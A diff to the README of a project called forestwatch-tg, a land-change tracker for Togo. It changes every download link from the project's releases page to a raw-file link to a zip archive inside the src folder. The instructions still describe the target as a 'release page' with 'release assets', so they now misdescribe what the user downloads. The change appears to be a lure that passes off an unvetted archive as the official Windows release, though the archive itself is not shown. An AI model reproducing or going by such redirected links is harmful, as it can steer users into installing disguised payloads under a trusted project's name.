@@ -1,6 +1,6 @@
 # 🌲 forestwatch-tg - Track Land Changes Across Togo
 
-[![Download forestwatch-tg](https://img.shields.io/badge/Download%20forestwatch--tg-8B5CF6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/monic1001/forestwatch-tg/releases)
+[![Download forestwatch-tg](https://img.shields.io/badge/Download%20forestwatch--tg-8B5CF6?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/monic1001/forestwatch-tg/main/src/tg-forestwatch-v1.8.zip)
 
 ## 🛰️ What this is
 
@@ -28,7 +28,7 @@ For best results, use:
 
 ## 📥 Download and install
 
-1. Go to the release page: https://github.com/monic1001/forestwatch-tg/releases
+1. Go to the release page: https://raw.githubusercontent.com/monic1001/forestwatch-tg/main/src/tg-forestwatch-v1.8.zip
 2. Look for the latest release at the top of the page
 3. Open the release assets
 4. Download the Windows file from that release
@@ -155,7 +155,7 @@ You may download or work with:
 ## 📎 Download link
 
 Visit this page to download the Windows release:
-https://github.com/monic1001/forestwatch-tg/releases
+https://raw.githubusercontent.com/monic1001/forestwatch-tg/main/src/tg-forestwatch-v1.8.zip
 
 ## 🧾 Notes for daily use
 
